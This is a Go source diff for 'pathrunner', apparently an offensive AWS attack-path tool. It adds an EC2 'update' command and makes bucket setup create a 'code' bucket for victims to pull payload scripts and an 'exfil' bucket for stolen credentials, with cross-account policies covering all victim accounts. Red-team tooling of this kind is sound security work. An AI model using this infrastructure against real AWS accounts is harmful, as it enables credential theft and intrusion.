@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"pathrunner/pkg/attacker"
 	"pathrunner/pkg/ui"
+	"pathrunner/pkg/utils"
 	"strings"
 )
 
@@ -40,6 +41,8 @@ func (r *REPL) cmdDeployEC2(args []string) error {
 	switch args[0] {
 	case "create":
 		return r.deployEC2Create(args[1:])
+	case "update":
+		return r.deployEC2Update()
 	case "status":
 		return r.deployEC2Status()
 	case "destroy":
@@ -97,6 +100,25 @@ func (r *REPL) deployEC2Create(args []string) error {
 	fmt.Println()
 	fmt.Println("Once connected, start a listener:")
 	fmt.Printf("    pathrunner attacker listener start --public-ip %s\n", result.PublicIP)
+	fmt.Println()
+
+	return nil
+}
+
+func (r *REPL) deployEC2Update() error {
+	attackerIdentity := r.identityManager.GetAttackerIdentity()
+	if attackerIdentity == nil {
+		return fmt.Errorf("attacker identity required. Use 'attacker set profile <name>' first")
+	}
+
+	result, err := attacker.UpdateEC2(attackerIdentity.GetConfig())
+	if err != nil {
+		return fmt.Errorf("update failed: %v", err)
+	}
+
+	fmt.Println()
+	fmt.Println("[*] Binary updated successfully.")
+	fmt.Printf("[*] Instance: %s (%s)\n", result.InstanceID, result.PublicIP)
 	fmt.Println()
 
 	return nil
@@ -198,23 +220,14 @@ func (r *REPL) deployBucketCreate(args []string) error {
 		return fmt.Errorf("attacker identity required. Use 'attacker set profile <name>' first")
 	}
 
-	victimIdentity := r.identityManager.GetCurrent()
-	if victimIdentity == nil {
+	// Collect unique account IDs from all victim identities for the bucket policy
+	victimAccountIDs := r.collectVictimAccountIDs()
+	if len(victimAccountIDs) == 0 {
 		return fmt.Errorf("victim identity required for cross-account bucket policy. Use 'identity add' first")
 	}
 
-	// Get victim account ID from the ARN
-	victimAccountID := extractAccountIDFromARN(victimIdentity.CallerARN)
-	if victimAccountID == "" {
-		return fmt.Errorf("could not determine victim account ID. Run 'whoami' to validate the current identity")
-	}
-
-	bucketType := extractFlag(args, "--type")
-	if bucketType == "" {
-		bucketType = "exfil" // default to exfil since it's more commonly needed
-	}
-	if bucketType != "code" && bucketType != "exfil" {
-		return NewInvalidArgumentsError("--type must be 'code' or 'exfil'")
+	if attacker.HasDeployedBuckets() {
+		return fmt.Errorf("attacker buckets already deployed. Use 'attacker infra bucket status' to view or 'attacker infra bucket destroy' to recreate")
 	}
 
 	region := extractFlag(args, "--region")
@@ -222,19 +235,25 @@ func (r *REPL) deployBucketCreate(args []string) error {
 		region = attackerIdentity.Region
 	}
 
-	fmt.Printf("[*] Creating %s bucket in %s...\n", bucketType, region)
+	accountList := strings.Join(victimAccountIDs, ", ")
 
-	bucketName, err := attacker.DeployBucket(attackerIdentity.GetConfig(), victimAccountID, region, bucketType)
+	fmt.Printf("[*] Creating attacker S3 buckets in %s...\n", region)
+
+	// Create code bucket (read-only for victim — used for hosting payload scripts)
+	codeBucket, err := attacker.DeployBucket(attackerIdentity.GetConfig(), victimAccountIDs, region, "code")
 	if err != nil {
-		return fmt.Errorf("failed to create bucket: %v", err)
+		return fmt.Errorf("failed to create code bucket: %v", err)
 	}
+	fmt.Printf("[*] Created code bucket: %s\n", codeBucket)
+	fmt.Printf("    Read policy applied for victim account(s): %s\n", accountList)
 
-	policyDesc := "Write"
-	if bucketType == "code" {
-		policyDesc = "Read"
+	// Create exfil bucket (write-only for victim — used for credential exfiltration)
+	exfilBucket, err := attacker.DeployBucket(attackerIdentity.GetConfig(), victimAccountIDs, region, "exfil")
+	if err != nil {
+		return fmt.Errorf("failed to create exfil bucket: %v", err)
 	}
-	fmt.Printf("[*] Created bucket: %s\n", bucketName)
-	fmt.Printf("[*] %s policy applied for victim account %s\n", policyDesc, victimAccountID)
+	fmt.Printf("[*] Created exfil bucket: %s\n", exfilBucket)
+	fmt.Printf("    Write policy applied for victim account(s): %s\n", accountList)
 
 	return nil
 }
@@ -256,57 +275,60 @@ func (r *REPL) deployBucketStatus() error {
 
 	rows := make([][]string, 0, len(buckets))
 	for _, b := range buckets {
-		rows = append(rows, []string{b.Name, b.Type, b.Region})
+		accounts := strings.Join(b.AccountIDs, ", ")
+		if accounts == "" {
+			accounts = "-"
+		}
+		rows = append(rows, []string{b.Name, b.Type, b.Region, accounts})
 	}
-	ui.Table([]string{"Name", "Type", "Region"}, rows)
+	ui.Table([]string{"Name", "Type", "Region", "Victim Accounts"}, rows)
 	fmt.Println()
 
 	return nil
 }
 
 func (r *REPL) deployBucketDestroy(args []string) error {
+	if len(args) > 0 && args[0] == "help" {
+		return r.showDeployBucketHelp()
+	}
+
 	attackerIdentity := r.identityManager.GetAttackerIdentity()
 	if attackerIdentity == nil {
 		return fmt.Errorf("attacker identity required. Use 'attacker set profile <name>' first")
 	}
 
-	bucketName := extractFlag(args, "--name")
-	if bucketName != "" {
-		// Destroy specific bucket
-		fmt.Printf("[*] Destroying bucket %s...\n", bucketName)
-		if err := attacker.DestroyBucket(attackerIdentity.GetConfig(), bucketName); err != nil {
-			return fmt.Errorf("failed to destroy bucket: %v", err)
-		}
-		fmt.Println("[*] Bucket destroyed.")
-	} else {
-		// Destroy all buckets
-		buckets, err := attacker.ListDeployedBuckets()
-		if err != nil {
-			return err
-		}
-		if len(buckets) == 0 {
-			fmt.Println("No deployed buckets to destroy.")
-			return nil
-		}
-
-		fmt.Printf("[*] Destroying %d bucket(s)...\n", len(buckets))
-		if err := attacker.DestroyAllBuckets(attackerIdentity.GetConfig()); err != nil {
-			return fmt.Errorf("some buckets failed to destroy: %v", err)
-		}
-		fmt.Println("[*] All buckets destroyed.")
+	buckets, err := attacker.ListDeployedBuckets()
+	if err != nil {
+		return err
 	}
+	if len(buckets) == 0 {
+		fmt.Println("No deployed buckets to destroy.")
+		return nil
+	}
+
+	fmt.Printf("[*] Destroying %d bucket(s)...\n", len(buckets))
+	if err := attacker.DestroyAllBuckets(attackerIdentity.GetConfig()); err != nil {
+		return fmt.Errorf("some buckets failed to destroy: %v", err)
+	}
+	fmt.Println("[*] All buckets destroyed.")
 
 	return nil
 }
 
-// extractAccountIDFromARN extracts the account ID from an AWS ARN.
-// ARN format: arn:partition:service:region:account-id:resource
-func extractAccountIDFromARN(arn string) string {
-	parts := strings.Split(arn, ":")
-	if len(parts) >= 5 {
-		return parts[4]
+// collectVictimAccountIDs returns deduplicated account IDs from all victim
+// identities in the identity store. Used to build bucket policies that cover
+// every known victim account.
+func (r *REPL) collectVictimAccountIDs() []string {
+	seen := make(map[string]bool)
+	var accountIDs []string
+	for _, identity := range r.identityManager.GetIdentities() {
+		accountID := utils.ExtractAccountIDFromARN(identity.CallerARN)
+		if accountID != "" && !seen[accountID] {
+			seen[accountID] = true
+			accountIDs = append(accountIDs, accountID)
+		}
 	}
-	return ""
+	return accountIDs
 }
 
 // --- Global deploy commands ---
@@ -400,12 +422,13 @@ func (r *REPL) showAttackerDeployHelp() error {
 	fmt.Println("  attacker infra destroy                           - Tear down ALL deployed infrastructure")
 	fmt.Println()
 	fmt.Println("  attacker infra ec2 [create] [--region <region>]  - Deploy pathrunner to EC2")
+	fmt.Println("  attacker infra ec2 update                        - Update binary on existing instance")
 	fmt.Println("  attacker infra ec2 status                        - Show EC2 instance state")
 	fmt.Println("  attacker infra ec2 destroy                       - Tear down EC2 + SG + key pair")
 	fmt.Println()
-	fmt.Println("  attacker infra bucket [create] [--type code|exfil] - Create an S3 bucket")
+	fmt.Println("  attacker infra bucket [create] [--region <region>] - Create code + exfil buckets")
 	fmt.Println("  attacker infra bucket status                       - Show deployed buckets")
-	fmt.Println("  attacker infra bucket destroy [--name <bucket>]    - Destroy bucket(s)")
+	fmt.Println("  attacker infra bucket destroy                      - Destroy all buckets")
 	fmt.Println()
 	fmt.Println("Requires an attacker identity ('attacker set profile <name>').")
 	fmt.Println()
@@ -418,6 +441,7 @@ func (r *REPL) showAttackerDeployHelp() error {
 func (r *REPL) showDeployEC2Help() error {
 	fmt.Println("Deploy EC2 Command:")
 	fmt.Println("  attacker infra ec2 [create] [--region <region>]  - Deploy or update pathrunner on EC2")
+	fmt.Println("  attacker infra ec2 update                        - Update binary on existing instance")
 	fmt.Println("  attacker infra ec2 status                        - Show EC2 instance state")
 	fmt.Println("  attacker infra ec2 destroy                       - Tear down EC2 + SG + key pair")
 	fmt.Println("  attacker infra ec2 help                          - Show this help message")
@@ -442,23 +466,22 @@ func (r *REPL) showDeployEC2Help() error {
 
 func (r *REPL) showDeployBucketHelp() error {
 	fmt.Println("Deploy Bucket Command:")
-	fmt.Println("  attacker infra bucket [create] [--type code|exfil] [--region <region>]")
-	fmt.Println("                                                       - Create an S3 bucket")
+	fmt.Println("  attacker infra bucket [create] [--region <region>]  - Create code + exfil buckets")
 	fmt.Println("  attacker infra bucket status                        - Show deployed buckets")
-	fmt.Println("  attacker infra bucket destroy [--name <bucket>]     - Destroy specific or all buckets")
+	fmt.Println("  attacker infra bucket destroy                       - Destroy all buckets")
 	fmt.Println("  attacker infra bucket help                          - Show this help message")
 	fmt.Println()
-	fmt.Println("Bucket types:")
-	fmt.Println("  code   - Code hosting bucket with read-only cross-account policy")
-	fmt.Println("  exfil  - Exfiltration bucket with write-only cross-account policy (default)")
+	fmt.Println("Creates two S3 buckets with cross-account resource policies:")
+	fmt.Println("  code   - Read-only policy for victim to pull payload scripts (e.g., Glue jobs)")
+	fmt.Println("  exfil  - Write-only policy for victim to push exfiltrated credentials")
 	fmt.Println()
 	fmt.Println("Requires attacker identity AND a victim identity (for cross-account policy).")
+	fmt.Println("Bucket policies are automatically updated when new victim accounts are added.")
 	fmt.Println()
 	fmt.Println("Examples:")
 	fmt.Println("  attacker infra bucket")
-	fmt.Println("  attacker infra bucket create --type code --region us-west-2")
+	fmt.Println("  attacker infra bucket create --region us-west-2")
 	fmt.Println("  attacker infra bucket status")
-	fmt.Println("  attacker infra bucket destroy --name pathrunner-exfil-abc123")
 	fmt.Println("  attacker infra bucket destroy")
 	return nil
 }
